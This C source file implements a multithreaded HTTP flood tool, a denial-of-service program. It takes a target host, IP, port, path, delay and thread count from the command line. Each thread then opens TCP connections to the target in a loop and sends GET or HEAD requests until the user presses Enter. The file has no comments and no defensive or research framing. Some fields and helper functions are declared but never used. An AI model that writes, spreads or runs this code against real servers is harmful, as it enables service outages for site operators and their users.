#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/time.h>

#define BUFFER_SIZE 128

typedef struct {
    char *host;
    char *ip;
    int port;
    char *subsite;
    int delay;
    int timeout;
    int random;
    int use_get;
    int allow_gzip;
    int is_flooding;
    long last_action;
} HTTPFlooder;

long tick() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (tv.tv_sec * 1000) + (tv.tv_usec / 1000);
}

void *flood(void *arg) {
    HTTPFlooder *flooder = (HTTPFlooder *)arg;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sock;

    while (flooder->is_flooding) {
        flooder->last_action = tick();
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            continue;
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(flooder->port);
        inet_pton(AF_INET, flooder->ip, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            close(sock);
            continue;
        }

        snprintf(buffer, BUFFER_SIZE, "%s /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
                 flooder->use_get ? "GET" : "HEAD", flooder->subsite, flooder->host);

        send(sock, buffer, strlen(buffer), 0);
        recv(sock, buffer, BUFFER_SIZE, 0);

        close(sock);
        usleep((flooder->delay + 1) * 1000);
    }

    return NULL;
}

void start_flood(HTTPFlooder *flooder) {
    flooder->is_flooding = 1;
    flooder->last_action = tick();
    pthread_t thread;
    pthread_create(&thread, NULL, flood, flooder);
    pthread_detach(thread);
}

void stop_flood(HTTPFlooder *flooder) {
    flooder->is_flooding = 0;
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        fprintf(stderr, "Usage: %s <host> <ip> <port> <subsite> <delay> <threads>\n", argv[0]);
        return 1;
    }

    HTTPFlooder flooder;
    flooder.host = argv[1];
    flooder.ip = argv[2];
    flooder.port = atoi(argv[3]);
    flooder.subsite = argv[4];
    flooder.delay = atoi(argv[5]);
    flooder.timeout = 10000; // 10 seconds
    flooder.random = 0;
    flooder.use_get = 1;
    flooder.allow_gzip = 0;

    int threads = atoi(argv[6]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    if (!thread_ids) {
        perror("Failed to allocate memory for threads");
        return 1;
    }

    flooder.is_flooding = 1;
    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_ids[i], NULL, flood, &flooder);
    }

    printf("Press Enter to stop...\n");
    getchar();

    flooder.is_flooding = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    return 0;
}